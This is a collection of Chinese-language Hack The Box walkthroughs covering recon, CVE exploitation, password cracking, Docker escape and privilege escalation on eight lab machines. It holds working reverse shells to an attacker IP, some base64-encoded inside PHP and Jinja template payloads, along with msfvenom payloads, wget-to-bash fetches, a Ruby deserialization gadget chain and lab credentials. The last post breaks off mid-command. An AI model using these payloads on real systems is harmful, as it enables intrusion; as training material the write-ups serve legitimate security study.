[{"title":"HTB-BoardLight","url":"/post/606d94a37d5d/","content":"ip=&#x27;10.129.254.182&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ipecho &quot;$ip board.htb&quot; | sudo tee -a /etc/hosts\n\n开了22,80​\n\nvhost爆破翻了一圈没辙，htb提示爆破子域名\nffuf -w subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H &#x27;Host: FUZZ.board.htb&#x27; -fw 6243 -t 100\n\n找到crm.board.htb​\n\n弱口令弱口令admin&#x2F;admin直接登进来了\n\nCVE-2023-30253Dolibarr&lt;&#x3D;17.0.0 有个RCE\n\nhttps://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253\n\npython poc.py http://crm.board.htb admin admin 10.10.16.42 9001\n\n\n权限有点低，得考虑提权了\n提权找下suid有这些东西\n$ find / -user root -perm -4000 -print 2&gt;/dev/null/usr/lib/eject/dmcrypt-get-device/usr/lib/xorg/Xorg.wrap/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/sbin/pppd/usr/bin/newgrp/usr/bin/mount/usr/bin/sudo/usr/bin/su/usr/bin/chfn/usr/bin/umount/usr/bin/gpasswd/usr/bin/passwd/usr/bin/fusermount/usr/bin/chsh/usr/bin/vmware-user-suid-wrapper\n\n看下端口有3306\n\n找下数据库账号密码\nfind / -regex &quot;.*\\.php&quot; 2&gt;/dev/null | xargs grep -E &quot;=jdbc:|pass=|passwd=&quot; 2&gt;/dev/null \n\n配置文件在/var/www/html/crm.board.htb/htdocs/conf/conf.php​\n\n$dolibarr_main_db_name=&#x27;dolibarr&#x27;;$dolibarr_main_db_prefix=&#x27;llx_&#x27;;$dolibarr_main_db_user=&#x27;dolibarrowner&#x27;;$dolibarr_main_db_pass=&#x27;serverfun2$2023!!&#x27;;\n\nmysql -u&#x27;dolibarrowner&#x27; -p&#x27;serverfun2$2023!!&#x27; -e &#x27;SHOW TABLES FROM dolibarr;&#x27;mysql -u&#x27;dolibarrowner&#x27; -p&#x27;serverfun2$2023!!&#x27; -e &#x27;select * FROM dolibarr.llx_user;&#x27;\n\n挑点数据\n\n\n\nlogin\npass_crypted\napi_key\n\n\n\ndolibarr\n$2y$10$VevoimSke5Cd1&#x2F;nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm\nNULL\n\n\nadmin\n$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96\nyr6V3pXd9QEI\n\n\n看半天没用啊，结果是mysql密码登录ssh，htb老喜欢玩这个\nssh larissa@$ip\n\n\nenlightenment之前suid能看到enlightenment，问了下GPT这玩意有个提权洞\n\n\nhttps://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit\n\n\n\n3e992b38b4d504af1d4243a401568db7\n\n‍\n","categories":["HTB"],"tags":["CVE-2023-30253","vhost爆破","enlightenment"]},{"title":"HTB-Devvortex","url":"/post/462efc917bd2/","content":"\n垃圾题目，一个劲爆破\n\n10.129.90.31    devvortex.htbip=&#x27;10.129.90.31&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\n只开了22和80\n\nvhost爆破ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://devvortex.htb -H &#x27;Host: FUZZ.devvortex.htb&#x27; -fw 4 -t 100\n\n\n\nffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FFUZ -u http://dev.devvortex.htb/FFUZ/ -ic -t 100\n\nJoomla爆破出一个路径\n\n​/manifests/files/joomla.xml能看到版本\n\nCVE-2023-23752\n4.0.0 &lt;&#x3D; Joomla &lt;&#x3D; 4.2.7，未授权访问\n\n/api/index.php/v1/users?public=true /api/index.php/v1/config/application?public=true\n\n\n\n账号密码：lewis/P4ntherg0t1n5r3c0n##​\n反弹shell后台可以直接编辑php代码，直接RCE\n\n\n\nbash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.42/8989 0&gt;&amp;1&quot;YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi84OTg5IDA+JjEi&lt;?php system(&quot;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi84OTg5IDA+JjEi|base64 -d|bash&quot;); ?&gt;\n\n放到这，需要/templates/cassiopeia/error.php/123123让他报错触发，如果是访问/templates/cassiopeia/error.php没用\n\n\n脱库home里有个logan用户，和管理端里注册的一个用户名一致，所以想办法找下密码登下ssh试试\n\nweb目录下的configuration.php 有管理员账号密码和数据库密码\n\nfind / -name &#x27;configuration.php&#x27; 2&gt;/dev/nullmysql -u&#x27;lewis&#x27; -p&#x27;P4ntherg0t1n5r3c0n##&#x27; -e &#x27;SHOW TABLES FROM joomla;&#x27;mysql -u&#x27;lewis&#x27; -p&#x27;P4ntherg0t1n5r3c0n##&#x27; -e &#x27;select username,password from joomla.sd4fg_users;&#x27;\n\n+----------+--------------------------------------------------------------+| username | password                                                     |+----------+--------------------------------------------------------------+| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u || logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |+----------+--------------------------------------------------------------+\n\n爆破用hashid判断什么加密类型\n\nhashcat -m 3200 hash /usr/share/wordlists/rockyou.txt\n\n爆破出密码为tequieromucho​\n横移ssh logan@10.129.90.31\n\n\n\ncde6d1ee0995c2b2fda2431ea1561b13\n\n提权‍\n\n问了问GPT\n\n​/usr/bin/apport-cli 属于 Apport（Ubuntu&#x2F;Debian 的错误报告工具）。它在旧版本里自带一个  “报告查看器”  (apport-cli -f &lt;report&gt;)，而这个查看器默认会调用系统 $PAGER，缺省就是 less。如果 apport-cli 让你交互式查看文件，你就能从 less 里用 !sh 直接拿到 shell——从而把 (ALL : ALL) 的 sudo 权限转化为 root shell。\n\n# 生成个crashsleep 100 &amp; kill -SEGV $!sudo /usr/bin/apport-cli\n\n试了下不行，但原理确实如此。换种更好触发less分页器的方式\n看了下版本是2.20.11, 有CVE-2023-1326​\n\n先找个pid，比如systemd的\n\nsudo /usr/bin/apport-cli -f -P 1686\n\n一路y下去\n\n到这选可视模式V\n\n触发less后输入!/bin/bash就出shell了\n\n\n9db5ee1c5652037bfaec1efcb9e26b85\n\n‍\n","categories":["HTB"],"tags":["vhost爆破","Joomla","CVE-2023-23752"]},{"title":"HTB-Driver","url":"/post/11acd23e8de2/","content":"ip=&#x27;10.129.254.60&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\n开了80,135,445,5985​\n上来basic登录\n\nadmin&#x2F;admin直接进来了\n\n这里也有提示\n\nresponderhtb提示搜smb share upload file attack​\n\nhttps://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack\n\n搜到这篇文章，其中有个scf文件模板，联想到smb，那显然是responder\n[Shell]Command=2IconFile=\\\\10.10.16.42\\share\\icon.ico[Taskbar]Command=ToggleDesktop\n\nresponder -I tun0 -v\n\n直接抓到一堆认证\n\n[SMB] NTLMv2-SSP Client   : 10.129.254.60[SMB] NTLMv2-SSP Username : DRIVER\\tony[SMB] NTLMv2-SSP Hash     : tony::DRIVER:f57ce3d84a0014can\nhashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n\n爆破出密码为liltony​\nnxc smb $ip -u &#x27;tony&#x27; -p &#x27;liltony&#x27; --shares\n\n\nnxc winrm $ip -u &#x27;tony&#x27; -p &#x27;liltony&#x27;evil-winrm -i $ip -u &#x27;tony&#x27; -p &#x27;liltony&#x27;\n\n显然可以winrm\n\n\n\n286b2149b0ed831c5264d8304bd2f37c\n\n提权RICOHpowershell的历史记录有东西\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n\n\n有个RICOH PCL6 UniversalDriver V4.23​\nicacls &quot;c:\\ProgramData\\RICOH_DRV\\RICOH PCL6 UniversalDriver V4.23\\_common\\dlz\\*.dll&quot;\n\nF标志表示完全访问， I标志表示权限是从父目录继承的。继承的可写标志源自父目录。\n\nicacls &quot;c:\\ProgramData\\RICOH_DRV\n\n整个目录都有完全控制权\n\n启动msf，搜索下相关模块\n\n但看options需要一个session，所以先上msf马\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=4444 -f exe &gt;shell.exe\n\nuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost tun0set lport 4444\n\n\n试了好几次都不行\n\n看了眼代码也不知道哪里卡主了，似乎是条件竞争的洞，懒得折腾了\n\nPrintNightmarenxc smb $ip -u tony -p liltony -M spooler\n\n​​\n既然有打印机，就不得不查下打印机噩梦这个洞了\nnxc smb $ip -u tony -p liltony -M printnightmare\n\n提示漏洞存在，且工具也说了\n\nmsf生成个dll，然后上传\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=4444 -f dll &gt;shell.dll\n\n执行exp\npython printnightmare.py -dll &#x27;C:\\Users\\tony\\shell.dll&#x27; &#x27;tony:liltony@$DRIVER&#x27;\n\n试了两回，第一回还是tony，第二回成功了\n\n\n\n‍\n","categories":["HTB"],"tags":["responder","RICOH","PrintNightmare"]},{"title":"HTB-Paper","url":"/post/b505816a5383/","content":"10.129.63.64    office.paperip=&#x27;10.129.63.64&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\n\n\n\n版本WordPress 5.2.3​\n\nCVE-2019-17671未授权访问隐藏post\n/?static=1/?static=1&amp;order=asc #这里会404\n\n\n看到个http://chat.office.paper/register/8qozr226AhkCHZdyY​\n\nhttps://github.com/RocketChat/hubot-rocketchat\n\n\n注册的时候用admin昵称提示被占用\n这个机器人似乎可以命令注入？\n\n找出路径了\n\nrecyclops file sale/portfolio.txt&lt;!=====Contents of file sale/portfolio.txt=====&gt;Portfolio----------- Bill- Served the country in war- Family built the country- purchased paper worth a million dollars- will probably fire me.&lt;!=====End of file sale/portfolio.txt=====&gt;\n\n直接目录穿越\n\n之前etc不行是真的没权限访问\n\n\nrecyclops list ../Fetching the directory listing of ../total 32drwx------ 11 dwight dwight 281 Feb 6 2022 .drwxr-xr-x. 3 root root 20 Jan 14 2022 ..lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.shdrwx------ 5 dwight dwight 56 Jul 3 2021 .config-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_authdrwx------ 2 dwight dwight 44 Jul 3 2021 .gnupgdrwx------ 8 dwight dwight 4096 Sep 16 2021 hubot-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_historydrwx------ 3 dwight dwight 19 Jul 3 2021 .localdrwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilladrwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npmdrwxr-xr-x 4 dwight dwight 32 Jul 3 2021 salesdrwx------ 2 dwight dwight 6 Sep 16 2021 .ssh-r-------- 1 dwight dwight 33 Jul 30 11:04 user.txtdrwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim\n\n\n&lt;!=====Contents of file ../bot_restart.sh=====&gt;#!/bin/bash# Cleaning hubot&#x27;s log so that it won&#x27;t grow too large.echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.log# For starting the bot 20-ish (10+20) seconds late, when the server is restarted.# This is because MongoDB and Rocket-Chat server needs some time to startup properlysleep 10s# Checks if Hubot is running every 10swhile [ 1 ];dosleep 20salive=$(/usr/sbin/ss -tulnp|grep 8000);if [[ -n $alive ]]; thenerr=$(grep -i &#x27;unhandled-rejections=strict&#x27; /home/dwight/hubot/.hubot.log)if [[ -n $err ]]; then# Restarts botecho &quot;[-] Bot not running! date&quot;;#Killing the old processpid=$(ps aux|grep -i &#x27;hubot -a rocketchat&#x27;|grep -v grep|cut -d &quot; &quot; -f6);kill -9 $pid;cd /home/dwight/hubot;# Cleaning hubot&#x27;s log so that it won&#x27;t grow too large.echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.logbash /home/dwight/hubot/start_bot.sh&amp;elseecho &quot;[+] Bot running succesfully! date&quot;;fielse# Restarts botecho &quot;[-] Bot not running! date&quot;;#Killing the old processpid=$(ps aux|grep -i &#x27;hubot -a rocketchat&#x27;|grep -v grep|cut -d &quot; &quot; -f6);kill -9 $pid;cd /home/dwight/hubot;bash /home/dwight/hubot/start_bot.sh&amp;fidone&lt;!=====End of file ../bot_restart.sh=====&gt;\n\n/home/dwight/hubot/start_bot.sh\n\n&lt;!=====Contents of file ../../../../../home/dwight/hubot/start_bot.sh=====&gt;#!/bin/bashcd /home/dwight/hubotsource /home/dwight/hubot/.env/home/dwight/hubot/bin/hubot#cd -&lt;!=====End of file ../../../../../home/dwight/hubot/start_bot.sh=====&gt;\n\n​home/dwight/hubot/.env有账号密码\n&lt;!=====Contents of file ../../../../../home/dwight/hubot/.env=====&gt;export ROCKETCHAT_URL=&#x27;http://127.0.0.1:48320&#x27;export ROCKETCHAT_USER=recyclopsexport ROCKETCHAT_PASSWORD=Queenofblad3s!23export ROCKETCHAT_USESSL=falseexport RESPOND_TO_DM=trueexport RESPOND_TO_EDITED=trueexport PORT=8000export BIND_ADDRESS=127.0.0.1\n\n但是不允许登web端\n\n但passwd是可以读    \n\n有两个用户\nrocketchat❌1001:1001::/home/rocketchat:/bin/bashdwight❌1004:1004::/home/dwight:/bin/bash\n\n直接拿密码去登ssh，用户在之前就已经暗示是dwight了\nssh dwight@10.129.63.64\n\n\npkexec提权polkit版本为polkit-0.115-6.el8.x86_64，&lt;0.119, pkexec的提权洞\n\n\nhttps://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation\n\n./1.sh -p=pass123\n\n不行就多试几次，一开始密码设置为admin还不行，用默认密码也没成功。成功一次之后无论用什么密码都行。\n\n\n\n658a7b1b362501069febe4405316cc99\n\n","categories":["HTB"],"tags":["wordpress","CVE-2019-17671","pkexec"]},{"title":"HTB-Jerry","url":"/post/c0bcdae1a840/","content":"\nTomcat弱口令-&gt;上传war包\n\nip=&#x27;10.129.136.9&#x27;nxc smb 10.129.253.70 --generate-hosts-file ./hosts.txtcat hosts.txt | sudo tee -a /etc/hostsnmap -sC -sV -Pn -p- $ipports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\n\nadmin&#x2F;admin就进来了\n\nmanager进不来\n\n‍\n​\n\n感觉有点像CVE-2020-1938\n\n但8009不通\n\n爆破密码，为tomcat:s3cret​\n生成个war包上传，收工\n\n","categories":["HTB"],"tags":["Tomcat"]},{"title":"HTB-Writeup","url":"/post/d9ab780b6d17/","content":"ip=&#x27;10.129.253.209&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\n开了22和80\n\n页面提示防DOS，随便几个请求就封了一会IP，显然不让爆破\n提示vim，所以应该有vim的备份文件\n\nPage is hand-crafted with vi.\n\n试了.index.html. swp.index.html.swo和.index.html.swn都不行\nrobots.txt有文件\n\n\nCMS Made Simple网站为CMS Made Simple​\n\n有后台登录口\nhttp://10.129.253.209/writeup/admin/login.php\n\n2019年有个sql注入，CVE-2019-9053\n跑了下结果为\n[+] Salt for password found: 5a599ef579066807[+] Username found: jkr[+] Email found: jkr@writeup.htb[+] Password found: 62def4866937f08cc13bab43bb14e6f7\n\n还得爆破一下\necho &#x27;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&#x27; &gt; hashhashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt\n\n密码为raykayjay9​\n逆天，后台怎么都登不上，结果是ssh连，有病吧\n\n提权jkr@writeup:/tmp$ pkexec --versionpkexec version 0.105\n\n一键提权失败\n\nstaff组jkr@writeup:/tmp$ iduid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)\n\n这里的staff不是debian标准group\n# 看看系统里哪些文件属于 staffjkr@writeup:/tmp$ find / -group staff -type f 2&gt;/dev/null# 列出写目录jkr@writeup:/tmp$ find / -group staff -type d -perm -g+w 2&gt;/dev/null/var/local/usr/local/usr/local/bin/usr/local/include/usr/local/share/usr/local/share/sgml/usr/local/share/sgml/misc/usr/local/share/sgml/stylesheet/usr/local/share/sgml/entities/usr/local/share/sgml/dtd/usr/local/share/sgml/declaration/usr/local/share/fonts/usr/local/share/ca-certificates/usr/local/share/man/usr/local/share/emacs/usr/local/share/emacs/site-lisp/usr/local/share/xml/usr/local/share/xml/schema/usr/local/share/xml/misc/usr/local/share/xml/entities/usr/local/share/xml/declaration/usr/local/games/usr/local/src/usr/local/etc/usr/local/lib/usr/local/lib/python3.5/usr/local/lib/python3.5/dist-packages/usr/local/lib/python2.7/usr/local/lib/python2.7/dist-packages/usr/local/lib/python2.7/site-packages/usr/local/sbin\n\n重点关注这两个目录，都是可写的\njkr@writeup:/tmp$ ls -ld /usr/local/bin/ /usr/local/sbin/drwx-wsr-x 2 root staff 20480 Apr 19  2019 /usr/local/bin/drwx-wsr-x 2 root staff 12288 Apr 19  2019 /usr/local/sbin/\n\n接下来就是要找到在某个条件下会触发且带root权限以及和上述目录有关的程序\nhttps://github.com/DominicBreuker/pspy\n\n目前唯一能和系统交互的就只有ssh登录，所以在一个窗口启动pspy32，另起一个登录\n这样就抓到了ssh具体登录过程所触发的命令\n\n劫持首先观察到，有权限的两个路径/usr/local/bin/和/usr/local/sbin/写入环境变量后，就执行了run-parts，且为root权限\nCMD: UID=0    PID=2576   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new          CMD: UID=0    PID=2577   | run-parts --lsbsysinit /etc/update-motd.d \n\n而搜索run-parts会发现默认路径在/bin/run-parts​\njkr@writeup:~$ which run-parts/bin/run-parts\n\n显然，只需要在/usr/local/bin/和/usr/local/sbin/这两个路径创建个run-parts，就可以让系统优先执行恶意命令形成劫持\n放&#x2F;usr&#x2F;local&#x2F;bin ssh看起来和平时差不多\necho -e &#x27;#!/bin/bash\\n\\nchmod u+s /bin/bash&#x27; &gt; /usr/local/sbin/run-parts; chmod +x /usr/local/sbin/run-partsecho -e &#x27;#!/bin/bash\\n\\nchmod u+s /bin/bash&#x27; &gt; /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts\n\n重新登录ssh\n\n\n\nd4fff36a1a25b65512c9d645dd3db25b\n\n","categories":["HTB"],"tags":["CMS","pspy"]},{"title":"HTB-GoodGames","url":"/post/37d5881c4f49/","content":"ip=&#x27;10.129.96.71&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\nSQL注入显然，有SQL注入\n\n```![image](image-20250729223511-kelcvfu.png)```pythonsqlmap -u &quot;http://10.129.96.71/login&quot; --data=&quot;email=1&amp;password=test&quot; -p &#x27;email&#x27; --prefix=&quot;&#x27;&quot; --suffix=&quot;-- &quot; --proxy http://127.0.0.1:8080 --union-cols=4 --technique=U --skip-static --dbms=mysql\n\n直接拿sqlmap跑\n\n注意如果--suffix=&quot;--+&quot;，反而会出错，用+是为了传进去把他变成空格，那sqlmap命令直接写空格即可\n\nsqlmap -u &quot;http://10.129.96.71/login&quot; --data=&quot;email=1&amp;password=test&quot; -p &#x27;email&#x27; --prefix=&quot;&#x27;&quot; --suffix=&quot;-- &quot; --proxy http://127.0.0.1:8080 --union-cols=4 --technique=U --skip-static --dbms=mysql -D main --tables --ignore-redirectsDatabase: main[3 tables]+---------------+| user          || blog          || blog_comments |+---------------+\n\nsqlmap -u &quot;http://10.129.96.71/login&quot; --data=&quot;email=1&amp;password=test&quot; -p &#x27;email&#x27; --prefix=&quot;&#x27;&quot; --suffix=&quot;-- &quot; --proxy http://127.0.0.1:8080 --union-cols=4 --technique=U --skip-static --ignore-redirects  --dbms=mysql -D main -T user --columnsDatabase: mainTable: user[4 columns]+----------+--------------+| Column   | Type         |+----------+--------------+| name     | varchar(255) || email    | varchar(255) || id       | int          || password | varchar(255) |+----------+--------------+\n\nsqlmap -u &quot;http://10.129.96.71/login&quot; --data=&quot;email=1&amp;password=test&quot; -p &#x27;email&#x27; --prefix=&quot;&#x27;&quot; --suffix=&quot;-- &quot; --proxy http://127.0.0.1:8080 --union-cols=4 --technique=U --skip-static --ignore-redirects  --dbms=mysql -D main -T user --dump\n\n\n账号admin@goodgames.htb，密码解出来为superadministrator​\n进来又是一个面板\n\n\n开源的东西，github搜了下没洞，真的假的\n一样的账号密码能登进来\n\nSSTI存在SSTI\n\n复习一下\n\n是python3\n\n\n&lt;Config &#123;&#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SECRET_KEY&#x27;: &#x27;S3cr3t_K#Key&#x27;, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;USE_X_SENDFILE\n\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;\n\n\n找了半天终于找到个能用的\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n直接反弹shell\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo$&#123;IFS&#125;YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Mi80NDMgMD4mMSI=$&#123;IFS&#125;|base64$&#123;IFS&#125;-d|bash&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\nmd，有时候不是payload有问题，而是编码问题\n\n又是docker\n\ndocker逃逸挂载逃逸失败\n\nwget http://10.10.16.42:8000/container-escape-check.sh -O- | bash\n\n\nwget http://10.10.16.42:8000/1.c\n\nCVE-2020-14386失败\n\nwget http://10.10.16.42:8000/2.cgcc -m32 -static -o exploit 2.c\n\n仔细看df -h，这里挂载磁盘到home目录了\n\nscript /dev/null bashssh augustus@172.19.0.1\n\n有点扯，先看网卡，能访问172.19.0.1的22，然后切个tty，用之前的密码superadministrator登ssh\n\n\n提权首先docker挂载home目录，所以在宿主机复制一个bash过来\n\n然后回到docker，因为在docker里是root权限，所以给个4755(suid权限)，这样就可以手动suid提权\n\n\n再登录ssh，直接提权结束，superadministrator​\nssh augustus@172.19.0.1./bash -p\n\n\n\nad9b4ea7e99e152ee7d204a8d4f2cd8b\n\nuid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)# uid表明身份# euid表明有效id，意味着当前权限\n\n‍\n","categories":["HTB"],"tags":["docker逃逸","sql注入","SSTI"]},{"title":"HTB-Precious","url":"/post/041d853bdc7f/","content":"ip=&#x27;10.129.228.98&#x27;ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1| tr &#x27;\\n&#x27; &#x27;,&#x27; | sed s/,$//)nmap -p$ports -sC -sV $ip\n\n\n\n\nPhusion Passenger(R) 6.0.15\n\n找了一圈这个玩意没洞啊\n用exiftool看下生成的文件，用的pdfkit v0.8.6\n\npdfkit 0.8.6有个CVE-2022–25765​\n\nhttps://www.exploit-db.com/exploits/51293\n\npython poc.py -s 10.10.16.42 8989 -w http://precious.htb/ -p url\n\n反弹shell成功了，但没啥权限\n\n横向在这里找到账号密码，也太扯了\nenry:Q3c1AqGHtoI0aXAYFH\n\n\n\n\n5e3b05e507ab5bfb3bb9106425d545d3\n\n提权接下来考虑提权了\n\n​/opt/update_dependencies.rb​\n# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;require &quot;yaml&quot;require &#x27;rubygems&#x27;# TODO: update versions automaticallydef update_gems()enddef list_from_file    YAML.load(File.read(&quot;dependencies.yml&quot;))enddef list_local_gems    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;endgems_file = list_from_filegems_local = list_local_gemsgems_file.each do |file_name, file_version|    gems_local.each do |local_name, local_version|        if(file_name == local_name)            if(file_version != local_version)                puts &quot;Installed version differs from the one specified in file: &quot; + local_name            else                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name            end        end    endend\n\n扔给Kimi，一下就给出了思路\necho -e &#x27;---\\n!ruby/object:IO 2&gt;&amp;1 | /bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.42/4444 0&gt;&amp;1&quot;&#x27; &gt; dependencies.ymlsudo /usr/bin/ruby /opt/update_dependencies.rb\n\n可惜，并没有成功\n首先找到文件路径为/opt/sample/dependencies.yml，并没有具体配置\n\n从这抄个ruby反序列化的配置\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md\n\nruby版本为2.7.4p191​\n\n---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: &quot;abc&quot;      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module &#x27;Kernel&#x27;                 method_id: :system             git_set: id         method_id: :resolve\n\necho LS0tCi0gIXJ1Ynkvb2JqZWN0OkdlbTo6SW5zdGFsbGVyCiAgICBpOiB4Ci0gIXJ1Ynkvb2JqZWN0OkdlbTo6U3BlY0ZldGNoZXIKICAgIGk6IHkKLSAhcnVieS9vYmplY3Q6R2VtOjpSZXF1aXJlbWVudAogIHJlcXVpcmVtZW50czoKICAgICFydWJ5L29iamVjdDpHZW06OlBhY2thZ2U6OlRhclJlYWRlcgogICAgaW86ICYxICFydWJ5L29iamVjdDpOZXQ6OkJ1ZmZlcmVkSU8KICAgICAgaW86ICYxICFydWJ5L29iamVjdDpHZW06OlBhY2thZ2U6OlRhclJlYWRlcjo6RW50cnkKICAgICAgICAgcmVhZDogMAogICAgICAgICBoZWFkZXI6ICJhYmMiCiAgICAgIGRlYnVnX291dHB1dDogJjEgIXJ1Ynkvb2JqZWN0Ok5ldDo6V3JpdGVBZGFwdGVyCiAgICAgICAgIHNvY2tldDogJjEgIXJ1Ynkvb2JqZWN0OkdlbTo6UmVxdWVzdFNldAogICAgICAgICAgICAgc2V0czogIXJ1Ynkvb2JqZWN0Ok5ldDo6V3JpdGVBZGFwdGVyCiAgICAgICAgICAgICAgICAgc29ja2V0OiAhcnVieS9tb2R1bGUgJ0tlcm5lbCcKICAgICAgICAgICAgICAgICBtZXRob2RfaWQ6IDpzeXN0ZW0KICAgICAgICAgICAgIGdpdF9zZXQ6IGlkCiAgICAgICAgIG1ldGhvZF9pZDogOnJlc29sdmU= |base64 -d &gt; dependencies.ymlsudo /usr/bin/ruby 